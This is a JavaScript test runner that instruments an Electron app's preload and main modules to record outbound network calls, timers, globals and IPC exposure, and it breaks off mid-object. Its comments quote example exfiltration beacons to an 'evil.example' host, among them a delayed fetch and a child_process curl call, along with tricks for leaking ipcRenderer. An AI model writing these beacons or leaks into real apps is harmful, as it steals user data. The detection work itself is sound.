/**
 * BEHAVIORAL runner for src/integration/electron-behavior.test.mjs.
 *
 * WHY THIS EXISTS. Three consecutive independent reviews defeated the same
 * class of guard: source-text regexes over electron-main.cjs / electron-preload.cjs.
 * Each time the product was correct and the CHECK was wrong, and each time the
 * fix was a better regex that the next review beat with a new spelling —
 * `send: () => ipcRenderer.send`, `ALLOWED_PERMISSIONS.add('media')`,
 * `new Set([..., ...EXTRA])`, `const { openExternal } = shell`,
 * `ipcRenderer.send('ok', v), ipcRenderer.send('secret', v)`.
 *
 * A regex asks how the code is SPELLED. These checks ask what it DOES: load the
 * real modules under fake electron, capture the real handlers, invoke them, and
 * judge by IDENTITY and by recorded effect. Spelling becomes irrelevant, so the
 * whole family of evasions above dies at once rather than one variant at a time.
 *
 * Usage: node electron-behavior-runner.cjs <repoRoot> <mode>
 *   mode = 'permissions' — capture the handlers handed to
 *       session.setPermissionRequestHandler / setPermissionCheckHandler and
 *       invoke them with every documented Electron permission name.
 *   mode = 'bridge' — load electron-preload.cjs under a fake contextBridge and
 *       a fake ipcRenderer whose methods are identity-tagged; report the exposed
 *       key set, whether any exposed value (or its return value) IS the fake
 *       ipcRenderer or one of its methods, and every channel actually sent.
 *   mode = 'egress' — record every network-capable call made while loading
 *       electron-main.cjs and driving checkForUpdates, plus the exact set of
 *       module names it requires.
 *   mode = 'openexternal' — drive every navigation door with hostile schemes and
 *       report every argument that reached shell.openExternal, however it was
 *       spelled or aliased.
 *
 * Prints one line `RUNNER_RESULT <json>` and exits 0.
 */
const Module = require('module');
const path = require('path');

// The product THIS SUITE measures ships as a macOS .dmg and nothing else, and
// electron-main.cjs branches on process.platform three times — the menu
// template, titleBarStyle, and window-all-closed. Run on the host platform the
// runner measured whichever branch the runner happened to be on: green on a
// macOS laptop, and on ubuntu CI the menu collapsed to
// Menu.setApplicationMenu(null) so `menuRoles` came back [] and the guard
// failed for the platform rather than for a defect. Pin darwin so every host
// exercises the branch users actually receive. Restored in the finally below
// so nothing else in-process inherits it.
const REAL_PLATFORM = process.platform;
Object.defineProperty(process, 'platform', { value: 'darwin', configurable: true });
process.on('exit', () => {
  Object.defineProperty(process, 'platform', { value: REAL_PLATFORM, configurable: true });
});

const repoRoot = process.argv[2];
const mode = process.argv[3];
const VALID = ['permissions', 'bridge', 'egress', 'openexternal'];
if (!repoRoot || !VALID.includes(mode)) {
  console.error(`usage: electron-behavior-runner.cjs <repoRoot> <${VALID.join('|')}>`);
  process.exit(2);
}
const mainCjs = path.join(repoRoot, 'electron-main.cjs');
const preloadCjs = path.join(repoRoot, 'electron-preload.cjs');
// The egress mode boots the REAL backend, which binds a real port. Never the
// shipping 14321: a running installed app owns it, and the retry loop would
// then walk up into ports this process does not own. Overridable for CI.
const EGRESS_PORT = Number(process.env.EGRESS_PROBE_PORT || 4897);

// Write the result to a FILE, not stdout. The payload grew past the pipe
// buffer, and a truncated line reads as "SyntaxError: Unexpected end of JSON
// input" — a harness failure that looks nothing like the assertion it hides.
// stdout carries only the path. process.exit after a synchronous write is safe;
// console.log is not (it can drop a buffered tail on exit).
const RESULT_FILE = process.env.RUNNER_RESULT_FILE
  || path.join(require('os').tmpdir(), `nash-runner-${process.pid}.json`);

// TIMER CENSUS — for EVERY mode, installed before any product file loads.
//
// Each mode observes a window and then exits, so anything the app scheduled
// for after that window is invisible and raising the wait only moves the
// goalpost. The egress mode grew this census first (SR-10); the reviewer then
// showed the same trick works one door over, in the preload:
// `setTimeout(() => fetch('https://evil.example/collect'), 100)` ran with all
// 430 checks green, because the bridge mode calls out() as soon as the preload
// module finishes evaluating. A per-mode census would have been the same
// mistake a third time, so it lives here and out() reports it for all four.
//
// A recorded call answers "what did it dial?"; what is still ARMED when the
// window closes answers "what is it still going to do?", which no wait reaches.
// Keyed by handle so clear* can find the record again. A CANCELLED timer is
// not pending: electron-main.cjs legitimately arms a slow-boot fallback and
// clears it when the window opens, and without this the census called that a
// finding. Two reasons that matters, and the second is the important one —
// a check that fires on correct code gets switched off, and `setTimeout(...)`
// immediately followed by `clearTimeout` would otherwise be an easy way to
// make a real beacon look like noise the next reader learns to ignore.
const timerRecords = new Map();
const scheduledTimers = [];
const realSetTimeout = globalThis.setTimeout;
const realSetInterval = globalThis.setInterval;
const realClearTimeout = globalThis.clearTimeout;
const realClearInterval = globalThis.clearInterval;
const track = (rec, handle) => {
  scheduledTimers.push(rec);
  timerRecords.set(handle, rec);
  return handle;
};
globalThis.setTimeout = function (fn, ms, ...rest) {
  const rec = { ms: Number(ms) || 0, fired: false, cancelled: false, kind: 'timeout' };
  return track(rec, realSetTimeout.call(this,
    (...a) => { rec.fired = true; return fn && fn(...a); }, ms, ...rest));
};
// An interval never stops being armed unless it is cleared.
globalThis.setInterval = function (fn, ms, ...rest) {
  const rec = { ms: Number(ms) || 0, fired: false, cancelled: false, kind: 'interval' };
  return track(rec, realSetInterval.call(this, fn, ms, ...rest));
};
const markCancelled = (handle) => { const r = timerRecords.get(handle); if (r) r.cancelled = true; };
globalThis.clearTimeout = function (handle) {
  markCancelled(handle); return realClearTimeout.call(this, handle);
};
globalThis.clearInterval = function (handle) {
  markCancelled(handle); return realClearInterval.call(this, handle);
};
const pendingTimersNow = () => scheduledTimers
  .filter((t) => !t.fired && !t.cancelled).map((t) => t.ms);

// Canary values the bridge mode plants and the test subtracts again. Shared
// here so the two files cannot drift apart silently. 987654 is not a delay any
// real code would pick, so its presence is unambiguous.
const CANARY_URL = 'https://runner-canary.invalid/reporting-path';
const CANARY_TIMER_MS = 987654;
const CANARY_DOOR = '__runnerCanaryDoor';
// Two canaries because the census has TWO mechanisms and a canary only proves
// the one it goes through. A single hand-written getter survived deleting the
// whole descriptor-wrapping loop: it recorded, the list was non-empty, the
// assertion passed — with every real global untrapped. So one canary is an
// ordinary value property (wrapped by the same loop as `process`, `navigator`
// …) and one is undefined (defined by the same loop as `document`).
//
// The names carry a per-run NONCE the test generates and passes in env. A
// constant canary only defeats a list fabricated in ignorance of it:
// `preloadGlobalReads: [CANARY_GLOBAL, CANARY_GLOBAL_UNDEF]` survived every
// other check here, because it is exactly what the assertion wants. A name the
// runner cannot know until it starts cannot be written into the runner.
const NONCE = process.env.RUNNER_CANARY_NONCE || 'static';
const CANARY_GLOBAL = `__runnerCanaryGlobalRead_${NONCE}`;
const CANARY_GLOBAL_UNDEF = `__runnerCanaryGlobalUndef_${NONCE}`;

// Renderer globals that do not exist under Node. The census defines each as a
// recording getter (see ~line 366), so they are the HARNESS's additions, not
// the preload's — excluded from globals-added by getter identity, never by name.
const RENDERER_ONLY_GLOBALS = ['document', 'window', 'self', 'top', 'parent', 'location',
  'WebTransport', 'ServiceWorker', 'SharedWorker', 'Worker', 'BroadcastChannel', 'indexedDB',
  'localStorage', 'sessionStorage', 'caches', 'crypto', 'postMessage', 'open',
  CANARY_GLOBAL_UNDEF];

// OUTBOUND CALLS, recorded from the first line — for the preload too.
//
// The census above answers "what is still going to run?". It does not answer
// "what already ran?", and the two are not the same question: `queueMicrotask`
// and `Promise.resolve().then` defer past every synchronous read in the bridge
// mode WITHOUT arming a timer, and both were verified to actually fire before
// the child exits. The main-process modes instrument fetch/WebSocket/XHR much
// further down this file; the bridge block runs before that, so the preload was
// handed the real ones and its calls went unrecorded.
//
// Installed here so every mode shares one record. The main-process modes
// replace globalThis.fetch later with the update-reply stub — that stub pushes
// to this same array, so nothing is lost.
const networkCalls = [];
// Assigned without READING globalThis.fetch first: Node defines it as a lazy
// getter, and touching it instantiates undici's dispatcher, which adds
// Symbol(undici.globalDispatcher.1) to globalThis. The preload-globals diff
// then reported that symbol as a global the PRELOAD added — a false positive
// this instrumentation created, and the clean-tree run failed on it before
// this comment existed. The real fetch is not needed: nothing here forwards.
globalThis.fetch = function (url) {
  networkCalls.push(['fetch', String(url)]);
  // Do NOT complete the request: a probe that really dials is a probe that
  // exfiltrates. A rejected promise keeps `.catch()` chains working, which is
  // how a beacon is usually written.
  return Promise.reject(new Error('blocked by the behavioural harness'));
};

// THE RENDERER'S OTHER OUTBOUND DOORS. A preload runs in a renderer, where
// `XMLHttpRequest` and `navigator.sendBeacon` exist and work; under plain Node
// they are undefined, so those two mutants threw into their own catch and
// "passed" without ever being measured. That is the fake-lacks-the-method trap
// this harness has hit before: absence in the fake reads exactly like
// correctness in the product. Providing them turns a silent skip into a
// recorded call. sendBeacon in particular is the one built FOR this — fire and
// forget, survives page teardown.
globalThis.XMLHttpRequest = function XMLHttpRequest() {
  let target = '';
  return {
    open(method, url) { target = String(url); },
    send() { networkCalls.push(['XMLHttpRequest', target]); },
    setRequestHeader() {}, abort() {}, addEventListener() {}, removeEventListener() {},
    get readyState() { return 0; }, get status() { return 0; }, get responseText() { return ''; },
  };
};
if (!globalThis.navigator) globalThis.navigator = {};
try {
  globalThis.navigator.sendBeacon = (url) => {
    networkCalls.push(['sendBeacon', String(url)]);
    return true; // what a real one returns when the send is queued
  };
} catch { /* a frozen navigator cannot carry a beacon either */ }

// THE REST OF THE RENDERER'S OUTBOUND SURFACE. Same reason as XHR and
// sendBeacon above: these exist in a renderer and are `undefined` under plain
// Node, so a preload using one threw into its own catch and the suite passed
// without measuring anything. Each was verified to SURVIVE before being added.
//
//   EventSource        a GET that stays open — a channel, not just a ping
//   Image().src        the oldest beacon there is; no fetch, no XHR involved
//   RTCPeerConnection  a STUN/TURN url reaches the network during ICE setup
globalThis.EventSource = function EventSource(url) {
  networkCalls.push(['EventSource', String(url)]);
  return { close() {}, addEventListener() {}, removeEventListener() {} };
};
globalThis.Image = function Image() {
  const rec = {};
  Object.defineProperty(rec, 'src', {
    set(v) { networkCalls.push(['Image.src', String(v)]); },
    get() { return ''; },
  });
  return rec;
};
globalThis.RTCPeerConnection = function RTCPeerConnection(config) {
  for (const s of (config && config.iceServers) || []) {
    for (const u of [].concat(s.urls || s.url || [])) {
      networkCalls.push(['RTCPeerConnection', String(u)]);
    }
  }
  return {
    createDataChannel: () => ({ send() {}, close() {} }),
    createOffer: async () => ({}),
    setLocalDescription: async () => {},
    close() {}, addEventListener() {}, removeEventListener() {},
  };
};

// Which doors are actually live, PROBED rather than listed. A hardcoded list
// would still say "sendBeacon" after a frozen navigator silently dropped it —
// the control in the test would then be checking my intent, not the harness.
const outboundDoors = () => {
  const doors = [];
  for (const n of ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'Image',
    'RTCPeerConnection']) {
    if (typeof globalThis[n] === 'function') doors.push(n);
  }
  if (typeof globalThis.navigator?.sendBeacon === 'function') doors.push('sendBeacon');
  if (typeof globalThis[CANARY_DOOR] === 'function') doors.push(CANARY_DOOR);
  return doors;
};

const out = (payload) => {
  // Attached here, not by each mode: a mode that forgot would report a clean
  // run on an app still holding a live timer.
  const full = { pendingTimers: pendingTimersNow(), ...payload };
  require('fs').writeFileSync(RESULT_FILE, JSON.stringify(full));
  process.stdout.write(`RUNNER_RESULT_FILE ${RESULT_FILE}\n`);
  process.exit(0);
};

// ── mode: bridge ────────────────────────────────────────────────────────────
// Load the REAL preload with a fake contextBridge and a fake ipcRenderer whose
// every method is a distinct, tagged function. Identity comparison then answers
// "did the renderer get a live IPC handle?" regardless of how it was written.
if (mode === 'bridge') {
  const sent = [];
  const invoked = [];
  const ipcRenderer = {};
  const IPC_METHODS = ['send', 'invoke', 'sendSync', 'postMessage', 'on', 'once',
    'removeListener', 'removeAllListeners', 'sendTo', 'sendToHost'];
  for (const m of IPC_METHODS) {
    const fn = (...args) => {
      if (m === 'send' || m === 'sendSync' || m === 'postMessage') sent.push(args[0]);
      if (m === 'invoke') invoked.push(args[0]);
      return undefined;
    };
    fn.__isFakeIpcMethod = m;
    ipcRenderer[m] = fn;
  }
  ipcRenderer.__isFakeIpcRenderer = true;

  // EVERY exposure, not just the last one. Keeping a single `exposed` let a
  // second `exposeInMainWorld('nashInternal', {raw: ipcRenderer})` overwrite
  // itself out of the measurement — the namespace still reached the renderer.
  const exposures = [];
  const contextBridge = {
    exposeInMainWorld(key, api) { exposures.push({ world: 'main', key, api }); },
    // A separate API with the same effect for any script in that world.
    exposeInIsolatedWorld(worldId, key, api) {
      exposures.push({ world: `isolated:${worldId}`, key, api });
    },
  };

  // A preload runs with `window` as its global, so a plain assignment reaches
  // the page without contextBridge at all. Snapshot the globals, then diff.
  // Planted as an ordinary value property BEFORE the snapshot, so the census's
  // descriptor-wrapping loop wraps it exactly like `process` or `navigator` and
  // the diff below never sees it as added.
  globalThis[CANARY_GLOBAL] = 'canary';
  const globalsBefore = new Set(Reflect.ownKeys(globalThis));

  // WHAT THE PRELOAD REQUIRES. This hook already saw every require and threw
  // the information away — only electron-main.cjs's requires were recorded
  // (the filter ~700 lines down is `parent.filename === mainCjs`). So
  // `require('child_process').exec('curl https://evil.example')` in the
  // preload was invisible to all 437 checks: child_process is real under Node,
  // unlike the renderer-only APIs above, so the call actually ran.
  const preloadRequires = [];
  const originalLoad = Module._load;
  Module._load = function (request, parent, isMain) {
    preloadRequires.push(String(request));
    if (request === 'electron') return { contextBridge, ipcRenderer };
    return originalLoad.call(this, request, parent, isMain);
  };
  // SELF-TEST of the recorders themselves, run BEFORE the preload and then
  // rolled back. Every preload verdict below is "the list came back empty",
  // which is also exactly what a broken recorder produces: deleting the
  // `networkCalls.push` line, or hardcoding `preloadNetworkCalls: []`, or
  // faking `outboundDoors`, each left all 433 checks green. The egress mode
  // has a positive control but it covers a DIFFERENT fetch (the update-reply
  // stub, installed ~650 lines further down), so it could not see any of this.
  //
  // Drive each door with a known URL and check it was recorded, then truncate
  // the array so the real measurement starts clean.
  const selfTest = {};
  {
    const before = networkCalls.length;
    try { globalThis.fetch('https://selftest.invalid/f').catch(() => {}); } catch { /* recorded or not */ }
    selfTest.fetch = networkCalls.length > before;
    const b2 = networkCalls.length;
    try {
      const x = new globalThis.XMLHttpRequest();
      x.open('GET', 'https://selftest.invalid/x'); x.send();
    } catch { /* recorded or not */ }
    selfTest.XMLHttpRequest = networkCalls.length > b2;
    const b3 = networkCalls.length;
    try { globalThis.navigator.sendBeacon('https://selftest.invalid/b', 'd'); } catch { /* ditto */ }
    selfTest.sendBeacon = networkCalls.length > b3;
    const b5 = networkCalls.length;
    try { new globalThis.EventSource('https://selftest.invalid/e'); } catch { /* ditto */ }
    selfTest.EventSource = networkCalls.length > b5;
    const b6 = networkCalls.length;
    try { (new globalThis.Image()).src = 'https://selftest.invalid/i'; } catch { /* ditto */ }
    selfTest.Image = networkCalls.length > b6;
    const b7 = networkCalls.length;
    try {
      new globalThis.RTCPeerConnection({ iceServers: [{ urls: 'stun:selftest.invalid' }] });
    } catch { /* ditto */ }
    selfTest.RTCPeerConnection = networkCalls.length > b7;
    const b4 = scheduledTimers.length;
    realClearTimeout(globalThis.setTimeout(() => {}, 60000));
    selfTest.timerCensus = scheduledTimers.length > b4;
    // Roll back: these are the harness's own calls, not the preload's.
    networkCalls.length = before;
    scheduledTimers.length = b4;
  }
  // EVERY GLOBAL THE PRELOAD READS, whether or not this runner fakes it.
  //
  // Stubbing doors one at a time loses a race I cannot win: EventSource,
  // Image and RTCPeerConnection were added last round, and the next probe
  // immediately found seven more that are real in a renderer and `undefined`
  // here — serviceWorker, WebTransport, document.createElement('script').src,
  // link[rel=prefetch], form.submit, window.open, geolocation. Each was
  // invisible for the same reason: the mutant threw into its own catch, so
  // the suite measured nothing and reported success.
  //
  // The real preload is ten lines and reads exactly two globals. So census
  // what it TOUCHES instead of enumerating what it might touch, and let the
  // test pin that set. A door I have never heard of fails the same way.
  const globalReads = new Set();
  const censusGetters = new Map();
  const OWN = new Set(Reflect.ownKeys(globalThis));
  for (const key of OWN) {
    if (typeof key !== 'string') continue;
    // Skip the engine intrinsics every module touches; they carry no
    // capability and trapping them would drown the signal.
    if (['globalThis', 'undefined', 'NaN', 'Infinity', 'Object', 'Function', 'Array', 'String',
      'Boolean', 'Number', 'Math', 'JSON', 'Symbol', 'Promise', 'Reflect', 'Proxy', 'Error',
      'TypeError', 'RangeError', 'Map', 'Set', 'WeakMap', 'WeakSet', 'RegExp', 'Date'].includes(key)) continue;
    let d;
    try { d = Object.getOwnPropertyDescriptor(globalThis, key); } catch { continue; }
    if (!d || !d.configurable) continue;
    const read = () => { globalReads.add(key); };
    try {
      if ('value' in d) {
        const v = d.value;
        Object.defineProperty(globalThis, key, {
          configurable: true, enumerable: d.enumerable,
          get() { read(); return v; },
          set(nv) { read(); Object.defineProperty(globalThis, key, { configurable: true, enumerable: d.enumerable, writable: true, value: nv }); },
        });
      } else if (d.get) {
        Object.defineProperty(globalThis, key, {
          configurable: true, enumerable: d.enumerable,
          get() { read(); return d.get.call(globalThis); }, set: d.set,
        });
      }
    } catch { /* non-reconfigurable after all */ }
  }
  // An UNDEFINED global (document, window, WebTransport…) has no descriptor to
  // wrap, so reading it cannot be trapped that way. Define each as a getter
  // that records and then throws the same ReferenceError-shaped failure the
  // renderer would never produce — recorded first, so the preload's own
  // try/catch cannot hide the access.
  //
  // These are globals *I* added, so the globals-added diff below must not bill
  // them to the preload. It excludes them by GETTER IDENTITY, never by name:
  // the undici exemption was written as a name prefix and was spelled into
  // twice (`globalThis['Symbol(undici.evil)']`, then a real
  // `Symbol.for('undici.sneaky')`). A preload that redefines `document` to
  // something of its own replaces the getter, so identity stops matching and
  // the name is reported — which is the whole point.
  for (const name of RENDERER_ONLY_GLOBALS) {
    if (name in globalThis) continue;
    const get = () => { globalReads.add(name); return undefined; };
    try {
      Object.defineProperty(globalThis, name, { configurable: true, enumerable: false, get });
      censusGetters.set(name, get);
    } catch { /* ignore */ }
  }

  const timersBeforePreload = scheduledTimers.length;
  const networkCallsBeforePreload = networkCalls.length;
  // A CANARY that must reach the test through the real reporting path.
  //
  // The self-test above proves the recorders record; it says nothing about
  // whether the payload carries what they recorded. Hardcoding
  // `preloadNetworkCalls: []` or `pendingTimers: []` in out() left every check
  // green, because both are asserted to BE empty. So plant one entry that must
  // arrive, and have the test subtract it: a hardcoded empty array then loses
  // the canary and fails, while a real array keeps it.
  //
  // Planted AFTER the two offsets above, so it lands inside the reported slice
  // (planting it before put it outside and the canary never arrived — caught
  // on the first run). The timer canary is pushed straight into the census
  // rather than really armed: an unref'd interval would keep the child alive.
  // preloadTimers is a COUNT taken from the same array, so it subtracts one.
  networkCalls.push(['fetch', CANARY_URL]);
  scheduledTimers.push({ ms: CANARY_TIMER_MS, fired: false, cancelled: false, kind: 'interval' });
  // Probed live, and the canary door proves it was probed rather than typed:
  // a fabricated list would not know about it. Installed only for this call.
  globalThis[CANARY_DOOR] = () => {};
  const doorsOfferedToPreload = outboundDoors();
  delete globalThis[CANARY_DOOR];
  // Cleared here, not at install time: everything above — the recorder
  // self-test driving each door, the door probe itself — reads globals of its
  // own, and those are the HARNESS's reads, not the preload's. Only what
  // happens inside the require below is the preload's.
  globalReads.clear();
  // CANARY read, inside the measured window and left in the list for the test
  // to subtract. A boolean self-test ("did the trap fire?") was the first
  // spelling and it is fakeable twice over: `globalCensusSelfTest: true` and
  // `preloadGlobalReads: []` are both hardcodable, and both are exactly what
  // the assertions expect. A list that must CONTAIN something cannot be
  // fabricated empty. Deleted before the require so the preload never sees it.
  void globalThis[CANARY_GLOBAL];
  void globalThis[CANARY_GLOBAL_UNDEF];
  delete globalThis[CANARY_GLOBAL];
  delete globalThis[CANARY_GLOBAL_UNDEF];
  require(path.resolve(preloadCjs));
  Module._load = originalLoad;
  // Snapshot IMMEDIATELY: everything below enumerates globalThis (the
  // globals-added diff, isNodeInternalSymbol reading each value), and every
  // one of those reads would otherwise land in the census as the preload's.
  // The first run reported 41 globals for a ten-line preload — the harness
  // watching itself.
  const preloadGlobalReads = [...globalReads].sort();

  const isCensusGetter = (k) => {
    const g = censusGetters.get(k);
    if (!g) return false;
    const d = Object.getOwnPropertyDescriptor(globalThis, k);
    return !!d && d.get === g;
  };
  const globalsAdded = Reflect.ownKeys(globalThis)
    .filter((k) => !globalsBefore.has(k) && !isCensusGetter(k)).map(String);

  const exposed = exposures.length === 1 ? exposures[0].api : null;
  const exposedKey = exposures.length === 1 ? exposures[0].key : null;

  // Is this value a live IPC handle — the module object itself, or any of its
  // methods? Identity, not text: an alias, a rename, a property copy and a
  // returned method all compare equal here and are all equally dangerous.
  const isLiveIpc = (v) => v === ipcRenderer
    || (typeof v === 'function' && typeof v.__isFakeIpcMethod === 'string')
    || (v !== null && typeof v === 'object' && v.__isFakeIpcRenderer === true);

  // DEEP, not just the top level. Self-review found a surviving mutant:
  //   setBackgroundColor: (c) => { ipcRenderer.send('set-background-color', c);
  //                                return { raw: ipcRenderer }; }
  // It sends legitimately (so the "must reach ipcRenderer" control is happy),
  // keeps the key set unchanged (so the exact-keys check is happy), and the
  // handle is one level down (so a top-level identity check is happy) — while
  // the renderer still gets a live IPC object. Walk the whole returned graph.
  // A returned FUNCTION is the subtlest shape: it is not identity-equal to
  // anything, but calling it reaches IPC with a renderer-chosen channel —
  //   setBackgroundColor: (c) => ipcRenderer.send('ok', c) || ((...a) => ipcRenderer.send(...a))
  // So probe callables by invoking them and watching whether IPC moves.
  const probeReachesIpc = (fn) => {
    const before = sent.length + invoked.length;
    try { fn('__probe_channel__', '__probe_arg__'); } catch { /* a throw is not a leak */ }
    const moved = (sent.length + invoked.length) > before;
    if (moved) {
      // Do not let the probe's own traffic pollute the channel assertions.
      while (sent.length > 0 && sent[sent.length - 1] === '__probe_channel__') sent.pop();
      while (invoked.length > 0 && invoked[invoked.length - 1] === '__probe_channel__') invoked.pop();
    }
    return moved;
  };

  // `exempt` is the ONE value that is allowed to reach IPC when called: the
  // exposed member itself, whose channels face the whitelist separately.
  // Everything else — including that member's RETURN value — is a leak if
  // calling it moves IPC. Note the exemption is by identity, not by depth: a
  // returned closure sits at depth 0 of its own walk, and exempting depth 0
  // let the reviewer's `send(...) || ((...a) => ipcRenderer.send(...a))`
  // straight through.
  const findLiveIpc = (v, depth = 0, seen = new Set(), exempt = undefined) => {
    if (isLiveIpc(v)) return true;
    if (typeof v === 'function' && v !== exempt && probeReachesIpc(v)) return true;
    if (depth > 4 || v === null || typeof v !== 'object' || seen.has(v)) return false;
    seen.add(v);
    for (const key of Reflect.ownKeys(v)) {
      let child;
      try { child = v[key]; } catch { continue; } // a throwing getter hides nothing
      if (findLiveIpc(child, depth + 1, seen, exempt)) return true;
    }
    return false;
  };

  // The detector's own self-test, reported so the test can assert it. A walker
  // that found everything (or nothing) would make every member verdict below
  // meaningless, and a cyclic object must not hang it.
  const cyc = {}; cyc.self = cyc;
  const walkerSelfTest = {
    findsTopLevel: findLiveIpc(ipcRenderer),
    findsMethod: findLiveIpc(ipcRenderer.send),
    findsNested: findLiveIpc({ raw: ipcRenderer }),
    findsDeep: findLiveIpc({ a: { b: { c: ipcRenderer.send } } }),
    ignoresClean: findLiveIpc({ ok: true, n: 1, s: 'ipcRenderer' }) === false,
    survivesCycle: findLiveIpc(cyc) === false,
    // A returned closure is identity-equal to nothing; only calling it tells.
    findsReturnedClosure: findLiveIpc({ f: (...a) => ipcRenderer.send(...a) }),
    findsClosureViaInvoke: findLiveIpc({ f: (...a) => ipcRenderer.invoke(...a) }),
    // …and a closure that does NOT touch IPC must stay clean, or every member
    // returning any function at all would fail and the check would mean nothing.
    ignoresInertClosure: findLiveIpc({ f: (x) => x + 1 }) === false,
    // Probing must not leave its own traffic in the channel record.
    probeLeavesNoTrace: (() => {
      const before = [...sent, ...invoked].join('|');
      findLiveIpc({ f: (...a) => ipcRenderer.send(...a) });
      return [...sent, ...invoked].join('|') === before;
    })(),
  };

  const members = [];
  for (const [name, value] of Object.entries(exposed || {})) {
    const entry = { name, type: typeof value, leaksDirectly: findLiveIpc(value, 0, new Set(), value) };
    if (typeof value === 'function') {
      // Invoke it and inspect the RETURN value too: `() => ipcRenderer.send`
      // hands back the generic sender without ever being one itself.
      const before = sent.length + invoked.length;
      let returned;
      try { returned = value('#000000'); entry.threw = false; } catch (e) { entry.threw = true; }
      entry.leaksViaReturn = findLiveIpc(returned);
      entry.calledIpc = (sent.length + invoked.length) > before;
      // The one-argument call above leaves a whole shape untested: a member
      // that takes the CHANNEL from a later argument —
      //   setBackgroundColor: (c, ch) => ipcRenderer.send(ch || 'set-background-color', c)
      // — is a generic sender for any renderer that passes the second one, and
      // looks perfectly narrow when called with one. Whatever channels these
      // produce land in `sent`/`invoked` and face the whitelist like the rest.
      for (const extra of [['#000000', 'renderer-chosen-channel'],
        ['renderer-chosen-channel'], ['#000000', 'renderer-chosen-channel', {}],
        [{ channel: 'renderer-chosen-channel' }], []]) {
        try { findLiveIpc({ r: value(...extra) }); } catch { /* a throw is a refusal */ }
      }
    }
    members.push(entry);
  }
  // Judge every exposure, not only the single one the checks above unpack: a
  // second namespace is a second capability whatever it is called.
  // Each exposure's own TOP-LEVEL members are allowed to reach IPC (that is
  // what a bridge is for); their channels face the whitelist separately. Below
  // that, anything reaching IPC is a leak — so walk each member with itself
  // exempted, exactly as the per-member checks do.
  const exposureLeaks = (api) => {
    if (isLiveIpc(api)) return true;
    if (api === null || typeof api !== 'object') return findLiveIpc(api);
    return Object.values(api).some((v) => findLiveIpc(v, 0, new Set(), v));
  };
  // A preload is NOT finished when its top level is, and everything here used to
  // run synchronously after the require. An exposure deferred by a microtask, a
  // timer or a resolved promise —
  //   queueMicrotask(() => exposeInMainWorld('nashLate', { raw: ipcRenderer }))
  // — reached the renderer AFTER this process had reported "exactly one
  // exposure" and exited: invisible, with the report saying the tree was clean.
  // Drain both queues, then read. The counts are taken here rather than above
  // so a late exposure is measured, and `lateExposures` is reported so the test
  // can assert the drain happened instead of trusting that it did.
  //
  // Globals are read late TOO — a `Promise.resolve().then(() => globalThis.x =
  // ipcRenderer)` is the same evasion one door over. But this file has no
  // `return` after the bridge block, so the main-process section below keeps
  // executing and installs globals of its OWN (fetch, XMLHttpRequest,
  // WebSocket, onExpressListening, onDesktopLockFailure). Reading late without
  // excluding those attributed them to the preload — a false positive the drain
  // itself created, caught because the first run after this change failed
  // naming three of them. Named explicitly rather than filtered by a pattern:
  // if the runner grows another global, this list must be updated deliberately.
  //
  // Symbol(undici.globalDispatcher.N) is NODE's, not the preload's: the first
  // use of the built-in fetch stack anywhere in this process instantiates
  // undici's dispatcher and stamps that symbol onto globalThis. It appeared
  // the moment the outbound-door instrumentation went in, and the clean-tree
  // run failed naming it — matched by prefix because the counter increments.
  const RUNNER_OWN_GLOBALS = new Set(['fetch', 'WebSocket', 'XMLHttpRequest',
    'navigator', 'onExpressListening', 'onDesktopLockFailure', 'expressPort']);
  // Exempt only if the value is NOT a live IPC handle. Two mutation rounds
  // killed the name-shaped versions of this filter: matching the rendered name
  // let `globalThis['Symbol(undici.evil)'] = ipcRenderer` through (an ordinary
  // string property that merely prints like the symbol), and matching the
  // prefix on a real symbol let `globalThis[Symbol.for('undici.sneaky')] =
  // ipcRenderer` through. Any exemption written as a NAME can be spelled into.
  // Undici's dispatcher is not an IPC handle and a leak is, so the exemption
  // is the property of the value that actually matters.
  const isNodeInternalSymbol = (k) => typeof k === 'symbol'
    && String(k).startsWith('Symbol(undici.')
    && !(() => { try { return findLiveIpc(globalThis[k]); } catch { return true; } })();
  const syncExposureCount = exposures.length;
  // What the PRELOAD armed, measured across its own require and nothing else.
  // out()'s census cannot answer this one: this file has no `return` after the
  // bridge block, so electron-main.cjs loads afterwards and contributes its own
  // two timers (800, 3000) to the global list. Snapshotting around the preload
  // require isolates it — and the preload's correct answer is exactly zero, so
  // there is no threshold here to tune or outwait.
  // The DELAYS, not a count. A counter can always be faked to the expected
  // number — `preloadTimers: 1` (knowing about the canary) hid a live beacon
  // in exactly this way. A list has to contain the canary AND nothing else,
  // so a fabricated one is either missing the canary or missing the beacon it
  // is hiding. Reported with the canary still in; the test subtracts it.
  const preloadTimers = scheduledTimers.slice(timersBeforePreload).map((t) => t.ms);
  // realSetTimeout for the drain itself, so the runner's own wait is not
  // counted as a timer the preload armed.
  realSetTimeout(() => {
    const globalsNow = Reflect.ownKeys(globalThis)
      // isNodeInternalSymbol BEFORE map(String): it must see the real key, or
      // a string property that merely prints like the symbol is exempt too.
      .filter((k) => !globalsBefore.has(k) && !isNodeInternalSymbol(k) && !isCensusGetter(k))
      .map(String)
      .filter((k) => !RUNNER_OWN_GLOBALS.has(k));
    const allExposures = exposures.map((e) => ({
      world: e.world,
      key: e.key,
      keys: e.api && typeof e.api === 'object' ? Object.keys(e.api) : [typeof e.api],
      leaks: exposureLeaks(e.api),
    }));
    // A preload global that holds a live IPC handle reaches the page without
    // contextBridge at all.
    const globalLeaks = globalsNow.filter((k) => {
      try { return findLiveIpc(globalThis[k]); } catch { return false; }
    });
    out({ exposedKey: exposures.length === 1 ? exposures[0].key : null,
      keys: Object.keys(exposed || {}), members, sent, invoked, walkerSelfTest,
      allExposures, globalsAdded: globalsNow, globalLeaks,
      // > 0 means the preload exposed or assigned something AFTER its top level.
      lateExposures: exposures.length - syncExposureCount,
      // Timers the preload armed, counted across its require and NOTHING else.
      // Not "everything armed by the time the drain fires": this file has no
      // `return` after the bridge block, so electron-main.cjs loads in between
      // and arms its own two (800, 3000). A wider window would report 2 on a
      // clean tree and force a threshold, which is what lets a beacon hide.
      preloadTimers,
      // Everything the preload dialled, including from a microtask: the 60ms
      // drain outlasts any microtask queue, so a queueMicrotask/Promise.then
      // beacon has already been recorded by the time this reads.
      preloadNetworkCalls: networkCalls.slice(networkCallsBeforePreload),
      // Probed at the moment the preload ran, so the control cannot pass on a
      // door that was never really there.
      outboundDoors: doorsOfferedToPreload,
      // Proof the recorders above actually record; see the self-test block.
      recorderSelfTest: selfTest,
      // Includes the preload's own entry path, which the test filters out —
      // and that path is the canary: a hardcoded ['electron'] arrives without
